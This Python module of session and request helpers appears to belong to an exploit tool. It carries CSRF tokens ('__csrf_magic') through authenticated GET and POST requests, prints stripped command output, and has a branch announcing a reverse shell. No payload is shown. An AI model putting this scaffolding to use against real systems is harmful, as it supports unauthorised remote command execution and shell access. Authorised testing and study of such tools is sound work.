from re import findall

REGEX = "sid:.*;var"

def simple_get(loginSession:object, path:str, value, reqType:int) -> str:
    simpleUrl = loginSession.targetUrl + path + str(value)
    simpleHeaders = {"User-Agent": loginSession.userAgent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers"}
    
    r = loginSession.session.get(simpleUrl, headers=simpleHeaders, timeout=(loginSession.timeOut,loginSession.timeOut))
    if(reqType == 0): loginSession.csrf = findall(REGEX, r.text)[0][:-5]
    if(reqType == 1):
        # Strips off <pre> and \n</pre>
        print(r.text[5:-7])
        return
    if(reqType == 3): 
        print("Starting reverse shell")
        return
    return loginSession.csrf

def simple_post(loginSession:object, path:str, postData:dict, reqType) -> str:
    simpleUrl = loginSession.targetUrl + path
    simpleHeaders = {"User-Agent": loginSession.userAgent,
            "Accept-Encoding": "gzip, deflate",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Content-Type": "application/x-www-form-urlencoded"}

    # This is terrible :)
    try:
        postData["__csrf_magic"] = loginSession.csrf
    except:
        pass

    r = loginSession.session.post(simpleUrl, headers=simpleHeaders, data=postData, timeout=(loginSession.timeOut, loginSession.timeOut))

    if(reqType == 0):
        csrf = findall(REGEX, r.text)[0][:-5]
        return csrf
    # jank go brrr
    if(reqType == 1):
        # Strips off <pre> and \n</pre>
        print(r.text[5:-7])
        return
    if(reqType == 2):
        # Strips off <pre> and \n</pre>
        print(r.text[:-1]) 
        return

